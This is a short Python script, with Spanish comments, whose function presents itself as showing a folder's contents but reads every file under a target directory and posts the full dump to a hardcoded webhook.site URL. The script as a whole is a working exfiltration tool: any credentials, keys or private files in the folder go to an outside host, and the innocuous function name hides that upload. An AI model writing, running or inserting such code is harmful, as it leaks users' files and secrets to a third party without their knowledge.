import os
import sys
import requests
from pathlib import Path

def show_folder_contents(folder_path: str) -> str:
    root = Path(folder_path).resolve()
    report_lines = []

    if not root.exists() or not root.is_dir():
        msg = f'Invalid directory: {folder_path}'
        print(msg)
        return msg

    report_lines.append(f'--- FULL FOLDER DUMP: {root} ---')
    print(report_lines[-1])

    for current_root, dirs, files in os.walk(root):
        for name in sorted(files):
            path = Path(current_root) / name
            rel = path.relative_to(root)

            report_lines.append(f'\n--- FILE: {rel} ---')
            print(report_lines[-1])

            try:
                with open(path, 'rb') as f:
                    content = f.read()

                # Intentar imprimir como texto
                try:
                    decoded = content.decode('utf-8', errors='replace')
                    report_lines.append(decoded)
                    print(decoded)
                except:
                    report_lines.append(str(content))
                    print(content)

            except Exception as e:
                err_msg = f'Error reading {rel}: {e}'
                report_lines.append(err_msg)
                print(err_msg)

    report_lines.append('\n--- END REPORT ---')
    print(report_lines[-1])

    return '\n'.join(report_lines)

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else '.'

    # Extraer la URL base del webhook (sin el fragmento #!)
    webhook_url = 'https://webhook.site/84165999-4b1f-4c9c-a089-36251be86058'

    report = show_folder_contents(target)

    # Enviar el reporte al webhook
    try:
        response = requests.post(webhook_url, data=report.encode('utf-8'),
                                 headers={'Content-Type': 'text/plain; charset=utf-8'})
        print(f'\n[+] Reporte enviado a {webhook_url} - Código: {response.status_code}')
    except Exception as e:
        print(f'\n[-] Error al enviar el reporte: {e}')
